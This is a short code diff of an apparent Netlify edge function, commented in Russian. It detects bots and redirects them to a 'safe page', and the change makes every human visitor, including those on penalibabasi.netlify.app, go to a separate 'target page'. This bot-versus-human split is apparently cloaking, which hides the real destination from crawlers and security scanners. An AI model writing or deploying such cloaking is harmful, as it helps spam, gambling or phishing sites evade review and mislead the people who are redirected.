@@ -22,18 +22,14 @@ export default async (request: Request, context: Context) => {
   if (botInfo.isBot) {
     console.log(`🤖 Bot detected: ${botInfo.type} - ${botInfo.userAgent} - IP: ${botInfo.ip}`);
     
-    // Получаем URL для редиректа ботов
+    // Ботов редиректим на безопасную страницу
     const redirectUrl = getRedirectUrl(config.botRedirectUrl, url);
     
     return Response.redirect(redirectUrl, 302);
   }
 
-  // Если мы уже на основном домене — пропускаем
-  if (host.includes(config.mainDomain)) {
-    return context.next();
-  }
-
-  // Для реальных пользователей с других доменов - редиректим на основной домен
+  // Для реальных пользователей - всегда редиректим на целевую страницу
+  // (независимо от того, пришли они с penalibabasi.netlify.app или другого домена)
   const targetUrl = getTargetUrl(request, config);
   return Response.redirect(targetUrl, 302);
 };
@@ -53,5 +49,6 @@ export const config = {
     "/images/*"
   ]
 };
+
 
 
